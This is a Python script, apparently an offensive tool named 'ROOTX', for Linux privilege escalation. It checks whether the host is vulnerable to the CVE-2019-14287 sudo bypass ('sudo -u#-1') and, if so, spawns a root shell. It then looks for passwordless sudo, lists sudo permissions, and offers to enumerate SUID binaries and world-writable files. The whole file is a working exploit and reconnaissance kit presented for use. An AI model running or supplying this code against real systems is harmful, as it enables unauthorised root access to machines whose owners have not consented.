
import os
import subprocess
from colorama import Fore

print(Fore.MAGENTA + """
 ╦═╗╔═╗╔═╗╔╦╗═╗ ╦
 ╠╦╝║ ║║ ║ ║ ╔╩╦╝
 ╩╚═╚═╝╚═╝ ╩ ╩ ╚═ """   + Fore.RESET + Fore.GREEN + "V1.0\n" + Fore.RESET)
 
print('[' + Fore.CYAN + 'Username' + Fore.RESET + '] ' + os.getlogin())
OS = subprocess.getoutput("cat /etc/issue")
Kernal = subprocess.getoutput("uname -r")
print("[" + Fore.CYAN + "OS" + Fore.RESET + "] " + OS[:14])
print("[" + Fore.CYAN + "Kernal" + Fore.RESET + "] " + Kernal)
print('[' + Fore.CYAN + 'Checking' + Fore.RESET + '] if target is ' + Fore.RED + 'vulnerable' + Fore.RESET +  ' to ' + Fore.RED + 'CVE-2019-14287' + Fore.RESET)
root = subprocess.getoutput('sudo -u#-1 whoami')
if 'root' in root:
    print('[' + Fore.RED + 'Vulnerable' + Fore.RESET + '] to r00t ' + Fore.RED + 'Exploit!' + Fore.RESET)
    print('[' + Fore.CYAN + 'Executing' + Fore.RESET + ']' + Fore.RED + 'R00t ' + Fore.RESET + 'shell')
    while True:
        root = subprocess.getoutput('sudo -u#-1 /bin/bash')
else:
    print('[' + Fore.CYAN + 'Not Vulnerable' + Fore.RESET + '] to ' + Fore.RED + 'CVE-2019-14287' + Fore.RESET)
        
nopasswd = subprocess.getoutput('sudo -u root -n true')
if 'a password is required' in nopasswd:
    print('[' + Fore.CYAN + 'Root Account' + Fore.RESET + ']' + Fore.RED + ' Not ' + Fore.RESET + 'vulnerable to ' + Fore.RED + 'NO PASSWD ' + Fore.RESET + 'escalation')
    print('[' + Fore.CYAN + 'Checking Current' + Fore.RESET + '] User Permissions...')
    perm = subprocess.getoutput('sudo -l')
    if '(ALL : ALL)' in perm:
        print('[' + Fore.RED + 'Access Granted' + Fore.RESET + '] You have ' + Fore.RED + 'ALL Permissions!' + Fore.RESET)
    else:
        print(perm)
else:
    print('[' + Fore.RED + 'Vulnerable' + Fore.RESET + '] to sudo' + Fore.RED + 'No PASSWD' + Fore.RESET + 'escalation')

run_SUID = input('[' + Fore.CYAN + 'Question' + Fore.RESET + '] Did you want to check for ' + Fore.RED + 'SUID binaries' + Fore.CYAN + ' Y/N ' + Fore.RESET)
if run_SUID.upper() == "Y":
    print('[' + Fore.CYAN + 'Checking' + Fore.RESET + '] for' + Fore.RED + ' SUID ' + Fore.RESET + 'binaries...')
    SUID = subprocess.getoutput('find / -perm -u=s -type f 2>/dev/null')
    print(Fore.GREEN + SUID + Fore.RESET)
    
check_write = input('[' + Fore.CYAN + 'Question' + Fore.RESET + '] Did you want to check for ' + Fore.RED + 'Write Permissions' + Fore.CYAN + ' Y/N ' + Fore.RESET)
if check_write.upper() == "Y":
    CW = subprocess.getoutput('find / -not -type l -perm   -o+w')
    print(Fore.MAGENTA + CW + Fore.RESET)
